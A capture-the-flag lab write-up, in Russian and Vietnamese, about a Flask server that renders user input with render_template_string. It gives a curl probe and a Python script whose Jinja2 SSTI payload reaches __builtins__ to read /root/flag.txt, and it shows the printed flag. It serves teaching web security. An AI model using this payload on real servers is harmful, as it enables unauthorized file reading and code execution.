# Чтобы решить задание, нужно извлечь содержимое /root/flag.txt
Код сервера:
```python
from flask import Flask, request, render_template, render_template_string

app = Flask(__name__)

@app.route('/')
def index():
    return render_template("index.html")

@app.route('/feedback', methods=['GET'])
def feedback():
    content = request.args.get("content")
    return render_template_string(content)
```
Про SSTI можно почитать во многих статьях в интернете. Например, https://exploit-notes.hdks.org/exploit/web/framework/python/flask-jinja2-pentesting/

Подсказка: обратите внимание на ссылку, которая прикреплена выше. Вам нужно использовать модуль os, как один из вариантов, чтобы прочитать содержимое файла. Также вспомните как вывести содержимое файла в Linux

---
Để giải quyết vấn đề, bạn cần trích xuất nội dung của /root/flag.txt
---
# Cách thực hiện

Bài tập này liên quan đến SSTI (Server-Side Template Injection) trong Flask và Jinja2. Mục tiêu là khai thác lỗ hổng này để đọc nội dung file /root/flag.txt.

Phân tích mã nguồn:
Ứng dụng Flask có một endpoint /feedback chấp nhận tham số content thông qua phương thức GET.

Tham số content được chuyển thẳng vào hàm render_template_string(content), có nghĩa là nó sẽ render nội dung đó như một template của Jinja2.

Vì Jinja2 là một công cụ template mạnh mẽ của Python, nó cho phép chạy mã Python bên trong template nếu bạn khai thác được đúng cú pháp.

Cách khai thác lỗ hổng SSTI:

Bằng cách sử dụng cú pháp của Jinja2, bạn có thể thực thi mã Python trực tiếp trong template. Điều này có thể cho phép bạn chạy các lệnh hệ thống, như đọc file trong Linux.

Các bước thực hiện:

Thử kiểm tra lỗ hổng SSTI: Bạn có thể bắt đầu bằng cách thử một số payload đơn giản để xem liệu ứng dụng có dễ bị tấn công SSTI không. Một payload đơn giản là hiển thị kết quả của phép tính:

```{{ 7 * 7 }}```

Gửi yêu cầu:

```bash
curl "https://bef1bbeb-2d7b-4a70-8554-7dad938bef29-app.web.lms.itmo.xyz/feedback?content=\{\{7*7\}\}"
```

Kết quả trả về là 49, có nghĩa là ứng dụng bị lỗ hổng SSTI.

Tiếp theo: Đọc nội dung file: Sau khi xác nhận lỗ hổng, chúng ta có thể khai thác lỗ hổng để đọc nội dung file trên server, cụ thể là file /root/flag.txt. 

*Hãy thay ur bằng url của bạn*

```python
import requests

# URL của ứng dụng Flask
url = "https://bef1bbeb-2d7b-4a70-8554-7dad938bef29-app.web.lms.itmo.xyz/feedback"

# Tham số chứa payload
params = {
    "content": "{{ request.application.__globals__.__builtins__.open('/root/flag.txt').read() }}"
}

# Gửi yêu cầu GET với tham số
response = requests.get(url, params=params)

# In ra phản hồi từ server (nếu có)
print(response.text)
```

**Kết quả**

```bash
$ python3 SSTI_simple.py 
82b524e8e3ce84757eb329edf05b3a48e0de4619df6e53a795789c4a7617dcf60d05680e87079cf854df87b114da1010
```

Tổng quan quá trình hoạt động:

Gửi yêu cầu: Đoạn mã gửi yêu cầu GET tới server Flask với tham số content chứa payload khai thác lỗ hổng SSTI.

Thực thi trên server: Nếu server bị lỗ hổng, payload được chèn vào template và được thực thi trên server. Biểu thức Jinja2 yêu cầu server đọc file /root/flag.txt.

Nhận phản hồi: Server trả về nội dung của file đó dưới dạng phản hồi, và đoạn mã Python in ra nội dung này.

Giải thích 1 chút về 

Biến params là một từ điển chứa các tham số cần gửi trong URL của yêu cầu GET. Trong trường hợp này, tham số content chứa một biểu thức Jinja2 để khai thác lỗ hổng SSTI.

```Payload: "{{ request.application.__globals__.__builtins__.open('/root/flag.txt').read() }}"``` là một đoạn mã template injection (SSTI) được gửi đến server. Nó sẽ yêu cầu server mở file /root/flag.txt và đọc nội dung của nó, sau đó trả về kết quả như là một phần của phản hồi.


